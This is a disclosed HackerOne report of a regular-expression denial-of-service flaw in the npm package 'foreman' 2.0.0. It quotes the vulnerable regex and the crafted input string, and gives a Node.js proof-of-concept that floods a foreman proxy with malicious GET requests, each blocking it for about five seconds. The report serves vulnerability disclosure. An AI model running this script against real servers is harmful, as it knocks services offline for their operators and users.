# `foreman` is vulnerable to ReDoS in path

## Report Details
- **Report ID**: 320586
- **URL**: https://hackerone.com/reports/320586
- **State**: Closed
- **Severity**: high
- **Submitted**: 2018-02-28T03:13:44.212Z
- **Disclosed**: 2018-04-28T20:31:32.910Z

## Reporter
- **Username**: chalker
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: nodejs-ecosystem

## Vulnerability Information
I would like to report ReDoS in `foreman`.
It allows to cause denial of service by suppling a crafted path.

# Module

**module name:** foreman
**version:** 2.0.0
**npm page:** `https://www.npmjs.com/package/foreman`

## Module Description

> Node Foreman is a Node.js version of the popular Foreman tool, with a few Node specific changes.

## Module Stats

5 296 downloads in the last day
30 879 downloads in the last week
141 342 downloads in the last month

~1 696 104 estimated downloads per year

# Vulnerability

## Vulnerability Description

ReDoS.

Regex: `/http:\/\/[^/]*:?[0-9]*(\/.*)$/`
Evil string: `http://${Array(81000).join('0')}` (unwrap js template)
Line: https://github.com/strongloop/node-foreman/blob/v2.0.0/forward.js#L30
Blocks for ~5 seconds per request.

## Steps To Reproduce:

`nf start -f 9999`

```js
const net = require('net');
const tick = function() {
const client = net.createConnection({ port: 9999 }, () => {
  client.write(`GET http://${Array(81000).join('0')} HTTP/1.1
Host: localhost:9999


"`);
  });
}
setInterval(tick, 1000)
```

## Supporting Material/References:

- OS: Arch Linux current
- Node.js 9.5.0
- npm 5.6.0

# Wrap up

- I contacted the maintainer to let him know: N
- I opened an issue in the related repository: N

## Impact

Denial of Service by passing crafted paths.

## Attachments
No attachments
